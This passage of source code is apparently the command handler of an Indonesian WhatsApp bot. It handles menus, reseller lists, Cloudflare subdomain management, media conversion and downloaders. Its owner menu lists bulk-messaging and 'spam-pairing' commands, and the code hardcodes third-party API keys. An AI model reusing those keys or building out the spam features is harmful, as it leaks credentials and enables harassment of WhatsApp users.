Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "produkmenu": {

let teksmenu = `
Silahkan Pilih List Harga Produk`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Harga Produk", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Panel Pterodactyl", "title": "List Harga Panel", "id": ".list_panel" }, 
{ "header": "VPS", "title": "List Harga Vps", "id": ".list_vps" }, 
{ "header": "Domain", "title": "List Harga Domain", "id": ".list_domain" }, 
{ "header": "Script Bot", "title": "List Harga Script Bot", "id": ".list_scbot" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Klee.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "pushkontakmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ PUSH MENU ★
===============================
> pushkontak  
> pushkontak1  
> pushkontak2  
> savekontak  
> savekontak2  
> listgc  
> idgc  
> jpm  
> jpm2  
> jpmpromosi  
> jpmtesti  
> jpmhidetag  
> startjpm  
> setteksjpm  
> teksjpm  

`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "convertmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ CONVERTER ★
===============================
> toaudio  
> tomp3  
> tovn  
> toptv  
> tts  
> toimage  
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "panelmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ PANEL MENU ★
===============================
> addseller  
> delseller  
> listseller  
> addadmin  
> cpane  
> listpanel  
> listadmin  
> deladmin  
> delpanel  
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "domainmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ DOMAIN MENU ★
===============================
> listdomain  
> listsubdomain  
> delsubdomain  

`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "grupmenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ GROUP MENU ★
===============================
> addmember  
> antilink  
> antilinkV2  
> hidetag  
> tagall  
> delete  
> open/close  
> setnamagc  
> setdeskgc  
> setppgc  
> kick  
> promote  
> leavegc  
> leavegc2  
> demote
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "ownermenu": {

let teksmenu = `
*Haii* @${m.sender.split("@")[0]}\nSelamat ${ucapan()}

===============================
★ OWNER MENU ★
===============================
> clearsession  
> modeoff  
> modeon  
> done  
> anticall  
> autoread  
> welcome  
> setthumbnail  
> setppbotpanjang  
> setppbot  
> setnamabot  
> setbiobot 
> spam-pairing
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break

case "gcoff": case "modeoff": {

if (!isOwner) return KleeReply(msg.owner)
global.gconlyoff = true
m.reply('Berhasil Mengganti Ke Mode *Owner Off*')
}
break
case "gcon": case "modeon": {

if (!isOwner) return KleeReply(msg.owner)
global.gconlyoff = false
m.reply('Berhasil Mengganti Ke Mode *Owner ON*')
}
break
case "addseller": {

if (!isOwner) return KleeReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Reseller Panel!`)
await reseller.push(orang)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
case "delseller": {

if (!isOwner) return KleeReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Tidak Terdaftar Di Database Reseller Panel!`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menghapus ${orang.split('@')[0]} Dari Database Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break
case "listseller": {

if (!isOwner) return KleeReply(msg.owner)
if (reseller.length < 1) return m.reply("Tidak Ada Reseller Panel")
let teksnya = ` LIST RESELLER PANEL⚡\n\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
Klee.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qtoko})
}
break

case "setthumb": case "setthumbnail": {

if (!isOwner) return KleeReply(msg.owner)
if (!/image/g.test(mime)) return m.reply("Kirim/Balas Foto")
await Klee.downloadAndSaveMediaMessage(qmsg, "./media/thumbnail.jpg", false)
m.reply("Berhasil Mengganti Foto Thumbnail Menu ✅")
}
break
case "setppbot": case "setpp": {

if (!isOwner) return KleeReply(msg.owner)
if (/image/g.test(mime)) {
let media = await Klee.downloadAndSaveMediaMessage(qmsg)
await Klee.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti Foto Profile Bot ✅")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setppbotpanjang": case "setpppanjang": {

if (!isOwner) return KleeReply(msg.owner)
if (/image/g.test(mime)) {
var medis = await Klee.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await Klee.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil Mengganti Foto Profil Bot ✅")
} else return m.reply(example('dengan mengirim foto'))
}
break
case "setnamabot": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example('teksnya'))
Klee.updateProfileName(text)
m.reply("Berhasil Mengganti Nama Bot ✅")
}
break
case "setbio": case "setbiobot": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example('teksnya'))
Klee.updateProfileStatus(text)
m.reply("Berhasil Mengganti Bio Bot ✅")
}
break
case "listdomain": {

var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
m.reply(teks)
}
break
case "listsubdomain": case "listsubdo": {

if (!isOwner) return KleeReply(msg.owner)
if (!args[0]) return m.reply(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return m.reply("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return m.reply(teks)
})
}
break
case "domain1": case "domain2": case "domain3": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("host|ip"))
if (!text.split("|")) return m.reply(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return m.reply(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return m.reply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) m.reply(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else m.reply(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {

if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else return m.reply("Domain Tidak Ditemukan")
if (!sub.includes(".")) return m.reply("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return m.reply("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
m.reply(`Berhasil Menghapus Subdomain *${dom}* Dari Domain *${tldnya}*`)
}
break
case "tts": {

if (!text) return m.reply(example("Hallo saya manusia"))
if (text.length >= 300) return m.reply("Jumlah huruf harus di bawah 300!")
m.reply(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
Klee.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return m.reply(e.toString())
}
}
break
case "klee": {
if (!text) m.reply( 'Masukkan text!')
var api = await fetchJson(`https://api.betabotz.eu.org/api/search/c-ai?prompt=${text}&char=Klee&apikey=cF2rut48`)
Klee.sendMessage(m.chat, { text: api.message }, {quoted: m })
}
break
case "nahida": {
if (!text) m.reply( 'Masukkan text!')
var api = await fetchJson(`https://api.betabotz.eu.org/api/search/c-ai?prompt=${text}&char=Nahida&apikey=cF2rut48`)
Klee.sendMessage(m.chat, { text: api.message }, {quoted: m })
}
break
case "ai": case  "openai": {
if (!text) m.reply( 'Masukkan text!')
var api = await fetchJson(`https://api.betabotz.eu.org/api/search/openai-chat?text=${text}&apikey=cF2rut48`)
Klee.sendMessage(m.chat, { text: api.message }, {quoted: m })
}
break
case "play": {
    m.reply('maaf kak fitur sedang error...')
//if (!text) m.reply( 'Masukkan Judul!')
//var api = await fetchJson(`https://api.zeeoneofc.my.id/api/downloader/youtube-play?apikey=XZmIOW5azw5Loqr&query=${text}`)
//Klee.sendMessage(m.chat, { audio: { url: api.result.download }, mimetype: 'audio/mp3' }, { quoted: m })
}
break
case "ytmp3": {
if (!text) m.reply( 'Masukkan Link!')
var api = await fetchJson(`https://api.betabotz.eu.org/api/download/ytmp4?url=${text}&apikey=cF2rut48`)
Klee.sendMessage(m.chat, { audio: { url: api.result.mp3 }, mimetype: 'audio/mp3' }, { quoted: m })
}
case "ytmp4": {
if (!text) m.reply( 'Masukkan Link!')
var api = await fetchJson(`https://api.betabotz.eu.org/api/download/ytmp4?url=${text}&apikey=cF2rut48`)
Klee.sendMessage(m.chat, { video: { url: api.result.mp4 }, mimetype: 'video/mp4' }, { quoted: m })
}
break
case 'hdr': case 'remini':{
	   	if (!quoted) return m.reply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			m.reply("Proses Kak....")
			let media = await quoted.download()
			const { remini } = require('./all/remini.js')
			let proses = await remini(media, "enhance");
			Klee.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(5000)
			}
			break
			case "yts": {
if (!text) return m.reply(example("Dj Tiktok"))
await m.reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(mess.error)
let teks = '\n*🔎Hasil Pencarian YOUTUBE*\n\n'
for (let i of data.all) {
teks += `*◦ Judul :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Durasi :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
m.reply(teks)
}).catch(err => m.reply(err.toString()))
}
break
case "qc": {

if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply(msg.wait)
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Klee.sendStimg(m.chat, tempnya, m, {packname: namabot})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break
case "list_vps": {

let teks = `Belum Tersedia
( Silahkan Edit Di file case.js Line 1024 )`
Klee.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case "list_domain": {

let teks = `Belum Tersedia
( Silahkan Edit Di file case.js Line 1030 )`
Klee.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
break
case "list_panel": {

const teks = `Belum Tersedia
( Silahkan Edit Di file case.js Line 1038 )`
Klee.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break
case "list_scbot": {

let teks = `Belum Tersedia
( Silahkan Edit Di file case.js Line 1045 )`
Klee.sendMessage(m.chat, {text: teks}, {quoted: qpayment})
}
break


case "toptv": {

if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
Klee.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return m.reply(example("dengam mengirim/balas vidio"))
}
}
break
case "toimage": {

if (!/webp/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan reply sticker'))
m.reply(msg.wait)
let media = await Klee.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
Klee.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "tovn": case "toptt": {

if (!/video|audio/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim audio/vidio'))
m.reply(msg.wait)
await Klee.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
Klee.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case "toaudio": case "tomp3": {

if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim vidio'))
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik")
m.reply(msg.wait)
await Klee.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
Klee.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
case "sticker": case "stiker": case "sgif": case "s": {

if (!/image|video/.test(mime)) return m.reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
m.reply(msg.wait)
var media = await Klee.downloadAndSaveMediaMessage(qmsg)
await Klee.sendStimg(m.chat, media, m, {packname: global.packname})
await fs.unlinkSync(media)
}
break
case "tourl": {

if (!/image/.test(mime)) return m.reply(example("dengan mengirim foto"))
await m.reply(msg.wait)
var fotonya = await Klee.downloadAndSaveMediaMessage(qmsg)
var urlimage = await telegraPh(fotonya)
await m.reply(`Link Tautan :\n${urlimage}`)
await fs.unlinkSync(fotonya)
}
break
case "public": {

if (!isOwner) return KleeReply(msg.owner)
Klee.public = true
m.reply("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {

if (!isOwner) return KleeReply(msg.owner)
Klee.public = false
m.reply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case "get": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply("linknya")
try {
var check = await fetchJson(text)
m.reply(JSON.stringify(check, null, 2))
} catch (e) {
return m.reply(e.toString())
}}
break
case "setteksjpm": {

if (!isOwner) return KleeReply(msg.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./all/database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply(example("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*"))
}}
break
case "teksjpm": {

if (!isOwner) return KleeReply(msg.owner)
m.reply(fs.readFileSync("./all/database/teksjpm.js").toString())
}
break
case "instagram": case "igdl": case "ig": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("instagram.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await api.igdl(`${text}`).then((res) => {
for (let a of res.result) {
Klee.sendMedia(m.chat, a.url, m, {
caption: "Instagram Downloader Done ✅"})
}
}).catch(e => m.reply(e.toString()))
}
break
case "tiktokaudio": case "tiktokmp3": case "ttaudio": case "ttmp3": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokdl?url=${text}`).then((res) => {
Klee.sendMessage(m.chat, {audio: {url: res.result.music}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch(e => m.reply(e.toString()))
}
break
case "tiktokslide": case "ttslide": {

if (!text) return m.reply(example("linknya"))
if (!text.includes("tiktok.com")) return m.reply("Link tautan tidak valid!")
m.reply(msg.wait)
await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`).then(async (data) => {
if (!data.status) return m.reply(JSON.stringify(data, null, 2))
if (data.result.totalSlide == 0) return m.reply("Link Tiktok Bukan Slide!")
var cap = `*Tiktok Downloader Done ✅*`
for (let i of data.result.images) {
Klee.sendMessage(m.chat, {image: {url: `${i}`}, caption: cap}, {quoted: m})
}
}).catch(e => m.reply(e.toString()))
}
break
case "mediafire": {

if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
await api.mediafireDl(text).then((res) => {
if (res.filesize.includes("GB")) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.filesize.split("MB")[0] >= 100) return m.reply("Gagal mendownload, ukuran file terlalu besar")
if (res.url == "") return m.reply(mess.error)
Klee.sendMessage(m.chat, {document: {url: res.url}, fileName: res.filename, mimetype: "application/"+res.ext.toLowerCase(), caption: "Download Berhasil ✅"}, {quoted: m})
}).catch((e) => m.reply(e.toString()))
}
break
case 'pinterest':
case 'pin':{
if(!text)return m.reply("Mana text nya?")
const {GOOGLE_IMG_SCRAP} = require('google-img-scrap');
let cariimg = await GOOGLE_IMG_SCRAP({search: text,limit: 6,domains: ["pinterest.com"]})
let imgs = cariimg.result
let imgres = cariimg.result.length
if(imgres==0)return m.reply("Hasil tidak di temukan")
let lim = () => {
  if(imgres>5){return 5}else{return imgres} }
let lmt = lim()
let arrcard = []
for(let i=0;i<lmt;i++){
let eek = {
"header": proto.Message.InteractiveMessage.Header.create({...(await prepareWAMessageMedia({ image : await getBuffer(imgs[i].url)}, { upload: Klee.waUploadToServer})),
title: `*[PINTEREST SEARCH]*`,
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
"body": {
"text": `Hasil ${i+1} pinterest`
},
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Link","url":"${imgs[i].url}","merchant_url":"https://www.google.co.id"}`
}
]
})
   }
    arrcard.push(eek)
    await sleep(2000)
  }

let ctamsg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body:{text:"*Berikut Hasil Pencarian Anda*"},
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.create({
        "cards": arrcard,
        "messageVersion": 1
       }
    )
})
}
}
}, {});
await Klee.relayMessage(ctamsg.key.remoteJid, ctamsg.message, {
messageId: ctamsg.key.id
})

}
break

case "tt": {
if (!text) reply( 'Masukkan Link!')
    m.reply(msg.wait)
var api = await fetchJson(`https://api.betabotz.eu.org/api/download/tiktok?url=${text}&apikey=cF2rut48`)
Klee.sendMessage(m.chat, { video: { url: api.result.video },caption: "Nih Tuan", mimetype: 'video/mp4' }, { quoted: m })
}
break

case "antilink": {

if (!isGroup) return KleeReply(msg.group)
if (!isOwner && !isAdmin) return KleeReply(msg.admin)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Menyalakan *Antilink* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return m.reply(example("on/off"))
}}
break
case "antilinkV2": case "antilinkv2": {

if (!isGroup) return KleeReply(msg.group)
if (!isOwner && !isAdmin) return KleeReply(msg.owner)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Inii")
} else {
return m.reply(example("on/off"))
}}
break
case "welcome": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return m.reply("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
m.reply("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return m.reply("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
m.reply("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "autoread": {

if (!isOwner) return KleeReply(msg.owner)
if (!text) return m.reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return m.reply("*Autoread* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
autoread = true
m.reply("Berhasil Menyalakan *Autoread ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
